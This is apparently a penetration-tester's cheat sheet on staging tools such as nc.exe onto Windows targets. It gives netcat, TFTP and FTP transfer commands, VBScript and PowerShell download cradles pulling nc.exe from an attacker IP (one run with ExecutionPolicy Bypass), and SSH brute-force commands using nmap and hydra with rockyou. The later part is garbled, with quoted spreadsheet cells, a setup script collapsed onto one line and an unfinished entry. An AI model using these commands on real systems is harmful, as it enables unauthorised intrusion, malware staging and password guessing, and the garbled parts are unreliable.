
## File Transfer
Below methos can be used to transfer files..

## Transferring Files to Windows	## 
-**Running Webserver on Kali**
```
python -m SimpleHTTPServer 8080	
```
-**Transfer with Netcat**
```
//Kali
nc -lvp 1234 > zeroday.txt
//Win 
nc 192.168.0.114 1234 < zero-day.txt
```
ref: https://blog.ropnop.com/transferring-files-from-kali-to-windows/

-**TFTP**
If target has tftp running, you can easily check it by typing tftp on windows cmd. 
Starting tftp service : 
```
atftpd --daemon --port 69 /tftp 
/etc/init.d/atftpd restart
cd /srv/tftp
cp /var/www/html/nc.exe .
```
```
 //transfer nc.exe  
 
tftp -i 10.11.0.42 GET nc.exe
//PUT
tftp -i 10.11.0.42 PUT test.txt
```
-**FTP**
Setup FTP service by downloading pyftp library 
```
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21 -w
```
You can also automate ftp process by creating ftp.txt
```
echo open 10.11.0.42>ftp.txt
echo anonymous>>ftp.txt
echo password>>ftp.txt
echo binary>>ftp.txt
echo get nc.exe>>ftp.txt 
echo bye>>ftp.txt
ftp -s:ftp.txt
```

cf.	Setting FTP
```sh
#!/bin/bash 
 
groupadd ftpgroup 
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome 
pure-pw mkdb 
cd /etc/pure-ftpd/auth/ 
ln -s ../conf/PureDB 60pdb 
mkdir -p /ftphome 
chown -R ftpuser:ftpgroup /ftphome/ 
/etc/init.d/pure-ftpd restart
```
```
root@kali:~# chmod 755 setup-ftp 
root@kali:~# ./setup-ftp 
Password: 
Enter it again: 
Restarting ftp server
```

-**Creating VBscript**
wget.vbs * VBScript  (eg. in Windows XP, 2003) 
```sh
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject(""WinHttp.WinHttpRequest.5.1"") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject(""WinHttp.WinHttpRequest"") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject(""MSXML2.ServerXMLHTTP"") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject(""Microsoft.XMLHTTP"") >> wget.vbs
echo http.Open ""GET"",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject(""Scripting.FileSystemObject"") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = """" >> wget.vbs
echo strBuffer = """" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
**Usgage**  : ```cscript wget.vbs http://10.11.0.42/wget.exe wget.exe```


-**PowerShell-** (in Windows 7, 2008, and above) 	"echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = ""http://10.11.0.42/nc.exe"" >>wget.ps1 
echo $file = ""nc.exe"" >>wget.ps1 
echo $webclient.DownloadFile($url,$file) >>wget.ps1 "	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive NoProfile -File wget.ps1
"Debug.exe utility 
(In Windows 32bit OS - Works only for file < 64Kb)

"	"upx -9 nc.exe 
wine exe2bat.exe nc.exe nc.txt"	
"Pure ftp install in kali
""apt-get update && apt-get install pure-ftpd """	"#!/bin/bash 
 
groupadd ftpgroup 
useradd -g ftpgroup -d /dev/null -s /etc ftpuser 
pure-pw useradd offsec -u ftpuser -d /ftphome 
pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ../conf/PureDB 60pdb mkdir -p /ftphome chown -R ftpuser:ftpgroup /ftphome/ /etc/init.d/pure-ftpd restart "	
## - **SSH(22)** <br />
Bruteforce : <br />
```sh
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=users.txt --script-args ssh-brute.timeout=4s 10.x.x.x 
hydra -l user -P /usr/share/wordlists/rockyou.txt  10.x.x.x ssh -t 4
```
